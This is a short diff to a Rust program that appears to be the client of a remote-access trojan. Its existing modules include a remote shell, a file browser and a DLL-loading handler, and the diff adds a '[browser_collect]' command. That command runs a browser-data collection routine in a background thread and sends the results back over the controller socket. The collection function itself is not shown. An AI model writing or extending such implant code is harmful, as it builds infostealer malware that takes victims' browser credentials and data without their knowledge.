@@ -10,6 +10,7 @@ mod shell;
 mod tasks;
 mod filebrowser;
 mod rfe;
+mod browser;
 
 use std::{
     io::{BufRead, BufReader, Write},
@@ -210,6 +211,16 @@ fn handle_command(
 
     if let Some(rest) = cmd.strip_prefix("[rfe_dll]") {
         rfe::handle_dll(&sock, rest.trim());
+        return;
+    }
+
+    // ── Browser Data ─────────────────────────────────────────
+    if let Some(rest) = cmd.strip_prefix("[browser_collect]") {
+        let browser_name = rest.trim().to_string();
+        let sock_clone = Arc::clone(&sock);
+        thread::spawn(move || {
+            browser::collect_browser_data(&browser_name, &sock_clone);
+        });
         return;
     }
 }
